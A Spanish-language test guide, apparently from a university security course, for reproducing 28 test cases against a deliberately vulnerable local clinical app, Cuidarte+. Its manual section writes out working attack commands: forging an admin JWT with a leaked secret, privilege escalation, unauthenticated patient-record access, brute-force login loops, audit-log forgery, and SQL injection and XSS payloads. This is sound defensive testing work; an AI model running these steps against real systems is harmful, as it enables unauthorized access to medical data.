# Guía para reproducir las pruebas — Cuidarte+ (ISY1102 EP2)

Esta guía explica cómo levantar el sistema y repetir **los 28 casos de prueba del informe**,
más el análisis estático. Está pensada para Windows + Docker; todos los comandos son para **PowerShell**.

> ⚠️ El software es **intencionalmente vulnerable** (lo dice el propio `package.json` del backend).
> Las pruebas se hacen en local, con datos ficticios. No lo expongas a internet.

---

## 0. Qué vas a necesitar

- **Docker Desktop** (abierto y corriendo).
- **Node.js 18+**.
- Opcional: **pgAdmin** o **DBeaver** para mirar la base de datos.

```
EV2-seguridad-y-gestion/   <- carpeta donde clonaste el repositorio
├── CodigoFuenteB/        <- el proyecto (igual al que entregó el docente)
├── pruebas/
│   ├── run-tests.js          (26 casos contra la API)
│   ├── ui-tests.js           (CP-35 accesibilidad, CP-37 responsivo y CP-21 XSS en pantalla)
│   ├── render-evidence.js    (convierte los logs en imágenes PNG)
│   ├── reglas-semgrep.yaml   (11 reglas propias de análisis estático)
│   └── package.json
├── evidencia/            <- resultados ya generados (los del informe)
└── GUIA_PRUEBAS.md       <- este archivo
```

### Los 28 casos del informe

| Caso  | Nombre                                              | Dónde se prueba | Resultado | Incidente |
|-------|-----------------------------------------------------|-----------------|-----------|-----------|
| CP-01 | Inicio de sesión con credenciales válidas           | run-tests.js    | Aprobado  | —         |
| CP-02 | Cierre de sesión y revocación del token             | run-tests.js    | Fallido   | INC-14    |
| CP-04 | Registro de cuenta de paciente                      | run-tests.js    | Aprobado  | —         |
| CP-06 | Médico registra examen médico                       | run-tests.js    | Aprobado  | —         |
| CP-07 | Edición de examen médico                            | run-tests.js    | Aprobado  | —         |
| CP-08 | Paciente visualiza solo sus exámenes                | run-tests.js    | Aprobado  | —         |
| CP-10 | Adjuntar documento: formato permitido y rechazo     | run-tests.js    | Fallido   | INC-10    |
| CP-11 | Generación de registros de auditoría                | run-tests.js    | Fallido   | INC-16    |
| CP-14 | Validación frente a SQL Injection                   | run-tests.js    | Aprobado  | —         |
| CP-15 | Acceso a examen de otro paciente (IDOR)             | run-tests.js    | Aprobado  | —         |
| CP-16 | Ficha clínica por RUT sin autenticación             | run-tests.js    | Fallido   | INC-01    |
| CP-17 | Registro reclamando el RUT de otro paciente         | run-tests.js    | Fallido   | INC-06    |
| CP-18 | Paciente crea usuario administrador                 | run-tests.js    | Fallido   | INC-02    |
| CP-19 | Endpoints administrativos sin autenticación         | run-tests.js    | Fallido   | INC-03    |
| CP-20 | Médico se asigna el rol administrador               | run-tests.js    | Fallido   | INC-08    |
| CP-21 | XSS almacenado                                      | run-tests.js + ui-tests.js | Aprobado con observación | — |
| CP-22 | Paciente modifica datos clínicos de su ficha        | run-tests.js    | Fallido   | INC-11    |
| CP-23 | Falsificación de registros de auditoría             | run-tests.js    | Fallido   | INC-12    |
| CP-24 | Detalles técnicos en mensajes de error              | run-tests.js    | Fallido   | INC-15    |
| CP-25 | Protección contra fuerza bruta en login             | run-tests.js    | Fallido   | INC-09    |
| CP-26 | Cabeceras de seguridad y política CORS              | run-tests.js    | Fallido   | INC-13    |
| CP-27 | Comunicación protegida mediante TLS                 | run-tests.js    | Fallido   | INC-07    |
| CP-28 | Contraseñas almacenadas con hash                    | run-tests.js (incluye consulta SQL) | Fallido | INC-05 |
| CP-29 | Secreto JWT publicado (token falsificado)           | run-tests.js    | Fallido   | INC-04    |
| CP-31 | Paciente no accede a auditoría ni a usuarios        | run-tests.js    | Aprobado  | —         |
| CP-32 | Tiempo de respuesta CRUD < 300 ms                   | run-tests.js    | Fallido   | INC-17    |
| CP-35 | Accesibilidad WCAG 2.1 AA                           | ui-tests.js     | Fallido   | INC-18    |
| CP-37 | Visualización responsiva en móvil y tablet          | ui-tests.js     | Fallido*  | — (ver nota) |

Total según el informe: **10 aprobados** (CP-21 con observación) y **18 fallidos** → 18 incidentes (7 críticos, 6 graves, 4 moderados, 1 leve).

> \* **Nota CP-37:** en la reejecución del 19-10-2026 no hay desplazamiento horizontal en iPhone 12 ni en iPad,
> pero en iPhone 12 (390 px) la pestaña **«Últimos informes cargados»** del dashboard queda cortada fuera de la
> tarjeta (contenedor `MuiTabs-fixed` con `overflow: hidden`, sin scroll), y algunos textos de las tarjetas se
> recortan. Ver `evidencia/ui/home-iphone12.png`. Falta decidir si el informe lo registra como incidente.

---

## 1. Levantar el sistema

Todos los comandos usan `$REPO`, la carpeta donde clonaste el repositorio. Defínela una vez en cada ventana de PowerShell:
```powershell
$REPO = (Get-Location).Path   # ejecutar estando en la raíz del repositorio clonado
```

```powershell
cd "$REPO\CodigoFuenteB"
docker compose up -d --build
```

| Servicio    | URL / Puerto                                                    |
|-------------|-----------------------------------------------------------------|
| Frontend    | http://localhost:3333                                           |
| Backend API | http://localhost:4444                                           |
| PostgreSQL  | localhost:15442 (db `cuidarteplus`, user/pass `postgres/postgres`) |

Comprueba que responde: abre http://localhost:4444 → debe mostrar `{"name":"cuidarteplus","status":"ok"}`.

Usuarios de prueba (vienen en el dump):

| Rol      | Usuario   | Contraseña |
|----------|-----------|------------|
| Admin    | admin     | admin      |
| Médico   | medico    | medico     |
| Paciente | paciente  | paciente   |

> 💡 Las pruebas **modifican la base** (crean `admin_falso`, `atacante01`, `medico_test`, `paciente_test01/02`,
> un paciente con XSS, exámenes, documentos, roles, etc.) y fallan si esos usuarios ya existen.
> **Antes de repetirlas, reinicia la base a su estado original:**
> ```powershell
> docker compose down -v
> docker compose up -d
> ```

---

## 2. Ejecución automática

En otra ventana de PowerShell:

```powershell
cd "$REPO\pruebas"
npm install
npx playwright install chromium   # solo la primera vez

npm run test:api      # 26 casos de API  -> pruebas/evidencia/casos/CP-XX.txt
npm run test:ui       # CP-35, CP-37 y CP-21 UI -> pruebas/evidencia/ui/*.png
npm run evidencias    # convierte los .txt en imágenes -> pruebas/evidencia/img/
```

- `test:api` muestra una línea por caso con su estado (Aprobado / Fallido) y guarda
  `pruebas/evidencia/resultados-api.json`. Como el dump no trae exámenes, el script primero crea
  exámenes para los pacientes 1 (Juan), 2 (María) y 3 (Pedro) y un documento para María.
- CP-28 hace la consulta SQL solo (con `docker exec`) y deja `CP-28-db.txt`.
- `test:ui` necesita que antes se haya corrido `test:api` (ahí se crea el paciente con el payload XSS).
- Los resultados nuevos quedan en `pruebas/evidencia/`; los del informe están en `evidencia/` (raíz).

---

## 3. Ejecución manual (para mostrar en la defensa)

Para no repetir el login en cada ejemplo, primero guarda los tokens:
```powershell
$api = "http://localhost:4444"
function Login($u, $p) { (Invoke-RestMethod -Method Post "$api/autenticacion/login" -ContentType "application/json" -Body (@{nombre_usuario=$u; password=$p} | ConvertTo-Json)).token }
$tPac = Login "paciente" "paciente"
$tMed = Login "medico" "medico"
$tAdm = Login "admin" "admin"
```

### CP-16 — Ficha clínica sin iniciar sesión (Crítico, INC-01)
```powershell
Invoke-RestMethod "$api/pacientes/buscar/rut/16789456-K"
```
➡️ Devuelve la ficha completa de María González (alergias, grupo sanguíneo, dirección) **sin token**.
Lo correcto sería un **401**.

### CP-18 — Paciente se crea una cuenta de administrador (Crítico, INC-02)
```powershell
Invoke-RestMethod -Method Post "$api/usuarios" -Headers @{Authorization="Bearer $tPac"} -ContentType "application/json" -Body '{"nombre_usuario":"admin_falso","contrasena_hash":"123456","correo":"falso@mail.cl","rol_id":1}'
$t2 = Login "admin_falso" "123456"
Invoke-RestMethod "$api/usuarios" -Headers @{Authorization="Bearer $t2"}
```
➡️ El primer paso debería responder **403**, pero crea el usuario; el último muestra todos los usuarios.

### CP-19 — Endpoints administrativos sin token (Crítico, INC-03)
```powershell
Invoke-RestMethod -Method Post "$api/roles" -ContentType "application/json" -Body '{"nombre":"rol_sin_token"}'
Invoke-RestMethod -Method Delete "$api/usuarios/<id de un usuario de prueba>"
```
➡️ Ambos funcionan **sin cabecera Authorization** (201 y 200). Deberían responder **401**.

### CP-29 — Token de administrador falsificado con el secreto del README (Crítico, INC-04)
```powershell
cd "$REPO\pruebas"
$forjado = node -e "console.log(require('jsonwebtoken').sign({usuarioId:1,nombreUsuario:'admin',rolId:1,rolNombre:'admin'},'0d1d8132f0fde5beabb417b434ff10f1cae8635a461686b0f46ac9c2bbfbd0e8'))"
Invoke-RestMethod "$api/usuarios" -Headers @{Authorization="Bearer $forjado"}
```
➡️ Sin iniciar sesión, el token fabricado lista todos los usuarios (acceso de administrador).

### CP-28 — Contraseñas en texto plano (Crítico, INC-05)
```powershell
docker exec -it cuidarteplus-postgres-ev psql -U postgres -d cuidarteplus -c "SELECT id, nombre_usuario, contrasena FROM usuarios;"
```
➡️ Se ven las contraseñas tal cual (`admin`, `medico`, `Cuidarte#Test2026`…). Deberían ser hashes bcrypt (`$2b$10$...`).

### CP-17 — Registro con el RUT de otro paciente (Crítico, INC-06)
```powershell
Invoke-RestMethod -Method Post "$api/autenticacion/registro" -ContentType "application/json" -Body '{"nombre_usuario":"atacante01","password":"123456","correo":"atacante01@mail.cl","rut":"14.235.678-5"}'
$tAt = Login "atacante01" "123456"
Invoke-RestMethod "$api/pacientes/3" -Headers @{Authorization="Bearer $tAt"}
```
➡️ La cuenta nueva queda vinculada a la ficha de Pedro Muñoz sin verificar identidad y ve sus datos clínicos.

### CP-27 — Sin TLS (Crítico, INC-07)
Abre **https://localhost:4444** en el navegador → error de conexión: no hay HTTPS.
Abre **http://localhost:4444** → responde: todo viaja sin cifrar.

### CP-20 — Médico se auto-asigna rol admin (Grave, INC-08)
```powershell
# Con el admin se crea un médico de prueba para no tocar la cuenta 'medico'
$m = Invoke-RestMethod -Method Post "$api/usuarios" -Headers @{Authorization="Bearer $tAdm"} -ContentType "application/json" -Body '{"nombre_usuario":"medico_test","contrasena_hash":"medico123","correo":"medico_test@mail.cl","rol_id":2}'
$tM = Login "medico_test" "medico123"
Invoke-RestMethod -Method Put "$api/usuarios/$($m.id)" -Headers @{Authorization="Bearer $tM"} -ContentType "application/json" -Body '{"correo":"medico_test@mail.cl","rol_id":1}'
Invoke-RestMethod "$api/usuarios" -Headers @{Authorization="Bearer $(Login 'medico_test' 'medico123')"}
```
➡️ El médico pasa a `admin` y, tras volver a entrar, lista todos los usuarios.

### CP-25 — Fuerza bruta sin límite (Grave, INC-09)
```powershell
1..30 | ForEach-Object { try { Login "admin" "mala$_" } catch { $_.Exception.Response.StatusCode.value__ } }
Login "admin" "admin"
```
➡️ 30 veces **401** sin bloqueo ni retardo, y el intento 31 con `admin/admin` entra.

### CP-10 — Archivo ejecutable con MIME falsificado (Grave, INC-10)
Lo hace `run-tests.js`: el mismo binario se rechaza si declara `application/x-msdownload`,
pero se **acepta** (201) si declara `application/pdf`.

### CP-22 — Paciente edita sus datos clínicos (Grave, INC-11)
```powershell
Invoke-RestMethod -Method Put "$api/pacientes/1" -Headers @{Authorization="Bearer $tPac"} -ContentType "application/json" -Body '{"alergias":"Ninguna (editado por el paciente)","grupo_sanguineo":"AB-"}'
```
➡️ HTTP 200: el paciente cambia alergias y grupo sanguíneo. (El script restaura los valores originales después.)

### CP-23 — Paciente falsifica la auditoría (Grave, INC-12)
```powershell
Invoke-RestMethod -Method Post "$api/auditoria" -Headers @{Authorization="Bearer $tPac"} -ContentType "application/json" -Body '{"accion":"EXAMENES_ELIMINAR","detalles":"registro inventado"}'
```
➡️ HTTP 201: el registro inventado aparece en la bitácora del administrador.

### CP-26 — CORS abierto y sin cabeceras de seguridad (Grave, INC-13)
```powershell
(Invoke-WebRequest "$api/" -Headers @{Origin="https://sitio-malicioso.com"} -UseBasicParsing).Headers
```
➡️ `Access-Control-Allow-Origin: *` y no aparecen HSTS, X-Content-Type-Options, X-Frame-Options ni CSP.

### CP-02 — El token sigue sirviendo después de cerrar sesión (Moderado, INC-14)
```powershell
# (aquí se "cierra sesión"; el backend no tiene endpoint de logout)
Invoke-RestMethod "$api/examenes" -Headers @{Authorization="Bearer $tPac"}
```
➡️ El mismo token sigue funcionando; el backend no lo invalida.

### CP-24 — Error interno de PostgreSQL expuesto (Moderado, INC-15)
```powershell
try { Invoke-RestMethod "$api/examenes/abc" -Headers @{Authorization="Bearer $tMed"} } catch { $_.ErrorDetails.Message }
```
➡️ HTTP 500 con `invalid input syntax for type bigint: "abc"` (mensaje del motor de BD).

### CP-32 — Rendimiento (Moderado, INC-17)
```powershell
Measure-Command { Invoke-RestMethod "$api/examenes" -Headers @{Authorization="Bearer $tMed"} } | Select-Object TotalMilliseconds
```
➡️ Unos **5.000 ms** (el límite del ERS es 300 ms) por el `delayMiddleware(5000)` del código.

### CP-35 — Accesibilidad (Leve, INC-18)
En Chrome abre http://localhost:3333 → **F12** → pestaña **Lighthouse** → marca **Accesibilidad** →
**Analizar**. Aparecen los problemas de contraste. Con **Ctrl+Shift+M** (vista móvil) se ve que los
botones son más bajos que 44 px.

### Casos aprobados
- **CP-14 (SQL Injection):**
  `Invoke-RestMethod -Method Post "$api/autenticacion/login" -ContentType "application/json" -Body '{"nombre_usuario":"'' OR ''1''=''1","password":"x"}'`
  → **401**: el login rechaza la inyección (consultas parametrizadas).
- **CP-15 (IDOR):** con `$tPac`, `Invoke-RestMethod "$api/examenes/paciente/2" -Headers @{Authorization="Bearer $tPac"}` → **403**.
- **CP-31:** con `$tPac`, `GET /auditoria` y `GET /usuarios` → **403**.
- **CP-21 (XSS):** entra como `medico`, crea un paciente con nombre `<script>alert('XSS')</script>` y abre el
  listado de pacientes: el texto se ve tal cual y **no aparece ninguna alerta** (React lo escapa).
- **CP-37 (responsivo):** en Chrome, **F12 → Ctrl+Shift+M**, elige iPhone 12 e iPad: sin barra de desplazamiento horizontal,
  pero en iPhone 12 la segunda pestaña del dashboard ("Últimos informes cargados") queda cortada (ver nota de la sección 0).

---

## 4. Análisis estático (Anexo A del informe)

### 4.1 Semgrep (con Docker, sin instalar Python)
```powershell
cd "$REPO\CodigoFuenteB"
Copy-Item ..\pruebas\reglas-semgrep.yaml .

# Reglas de la comunidad (necesita internet)
docker run --rm -v "${PWD}:/src" semgrep/semgrep semgrep --config p/javascript --config p/nodejsscan --config p/secrets BACKEND/src FRONTEND/src

# Reglas propias del caso
docker run --rm -v "${PWD}:/src" semgrep/semgrep semgrep --config reglas-semgrep.yaml BACKEND/src FRONTEND/src
```

### 4.2 npm audit (dependencias vulnerables)
```powershell
cd "$REPO\CodigoFuenteB\BACKEND";  npm install; npm audit
cd "$REPO\CodigoFuenteB\FRONTEND"; npm install; npm audit
```

### 4.3 ESLint (calidad de código del frontend)
```powershell
cd "$REPO\CodigoFuenteB\FRONTEND"; npm run lint
```

---

## 5. Dónde está cada hallazgo en el código

| Incidente | Criticidad | Hallazgo                                   | Archivo |
|-----------|-----------|--------------------------------------------|---------|
| INC-01    | Crítico   | Ficha por RUT sin autenticación            | `BACKEND/src/routes/pacientes.js` (`/buscar/rut/:rut`) |
| INC-02    | Crítico   | Paciente crea admin                        | `BACKEND/src/routes/users.js` (`POST /`, no verifica rol) |
| INC-03    | Crítico   | Endpoints admin sin token                  | `BACKEND/src/routes/roles.js` (POST/PUT/DELETE), `users.js` (`DELETE /:id`) |
| INC-04    | Crítico   | Secreto JWT publicado                      | `CodigoFuenteB/README.md`, `.env`, `BACKEND/.env`; fallback `"inseguro"` en las rutas |
| INC-05    | Crítico   | Contraseñas en texto plano                 | `BACKEND/src/routes/auth.js` (líneas ~21 y ~110), `users.js:36` |
| INC-06    | Crítico   | Registro reclama RUT ajeno                 | `BACKEND/src/routes/auth.js` (`/registro`, `UPDATE pacientes SET usuario_id`) |
| INC-07    | Crítico   | Sin TLS                                    | `BACKEND/src/app.js`, `docker-compose.yml`, `FRONTEND/nginx.conf` |
| INC-08    | Grave     | Médico se auto-asigna admin                | `BACKEND/src/routes/users.js` (`updateUsuarioSistemaMedico`, `isAdminOrMedico`) |
| INC-09    | Grave     | Sin rate limiting; admin/admin             | `BACKEND/src/routes/auth.js`, `BACKEND/sql/dump-cuidarteplus.sql` |
| INC-10    | Grave     | Validación de archivo por MIME del cliente | `BACKEND/src/routes/documentos.js` (fileFilter) |
| INC-11    | Grave     | Paciente edita datos clínicos              | `BACKEND/src/routes/pacientes.js` (`PUT /:id`, `allowedFields`) |
| INC-12    | Grave     | Auditoría falsificable                     | `BACKEND/src/routes/audit.js` (`POST /`) |
| INC-13    | Grave     | CORS abierto, sin cabeceras                | `BACKEND/src/app.js` (`app.use(cors())`, sin helmet) |
| INC-14    | Moderado  | Sin logout en el backend                   | `BACKEND/src/routes/auth.js`, `FRONTEND/src/context/AuthContext.jsx` |
| INC-15    | Moderado  | Fuga de `err.message` al cliente           | Todas las rutas (`glosa: err.message`) |
| INC-16    | Moderado  | Fallo de auditoría en `/roles`             | `BACKEND/src/routes/roles.js` (`nombreUsuario` en columna numérica) |
| INC-17    | Moderado  | Retardos artificiales de 5 s               | `BACKEND/src/middleware/delay.js` + rutas |
| INC-18    | Leve      | Contraste y controles < 44 px              | Componentes de `FRONTEND/src` (Login y dashboard) |

---

## Resumen del flujo

1. `docker compose down -v` y `docker compose up -d` → sistema arriba con la base limpia.
2. `npm run test:api` → 26 casos de API (incluye la consulta SQL de CP-28).
3. `npm run test:ui` → CP-35 (accesibilidad), CP-37 (responsivo) y CP-21 (XSS en pantalla).
4. Semgrep + npm audit + ESLint → análisis estático.
5. `npm run evidencias` → capturas para el informe.

Enfoque: **basado en riesgos**, priorizando el control de acceso y la protección de datos clínicos
(Ley N°21.719), porque es lo más crítico en un sistema de salud.
